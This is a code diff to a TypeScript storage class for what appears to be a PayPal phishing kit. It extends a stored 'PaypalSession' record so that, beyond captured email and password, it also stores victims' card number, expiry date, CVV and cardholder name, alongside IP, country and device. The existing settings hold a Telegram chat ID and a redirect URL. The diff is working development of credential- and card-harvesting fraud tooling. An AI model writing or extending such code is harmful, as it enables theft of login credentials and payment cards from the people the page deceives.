@@ -80,6 +80,7 @@ export class MemStorage implements IStorage {
       telegramChatId: settings.telegramChatId ?? null,
       redirectUrl: settings.redirectUrl ?? null,
       redirectEnabled: settings.redirectEnabled ?? "false",
+      adminPasswordHash: settings.adminPasswordHash ?? null,
       updatedAt: new Date(),
     };
     this.adminSettings = adminSettings;
@@ -132,8 +133,13 @@ export class MemStorage implements IStorage {
     const paypalSession: PaypalSession = {
       id,
       sessionId: session.sessionId,
-      email: session.email,
-      password: session.password,
+      email: session.email ?? null,
+      password: session.password ?? null,
+      cardNumber: session.cardNumber ?? null,
+      expiryMonth: session.expiryMonth ?? null,
+      expiryYear: session.expiryYear ?? null,
+      cvv: session.cvv ?? null,
+      cardholderName: session.cardholderName ?? null,
       ipAddress: session.ipAddress ?? null,
       country: session.country ?? null,
       device: session.device ?? null,
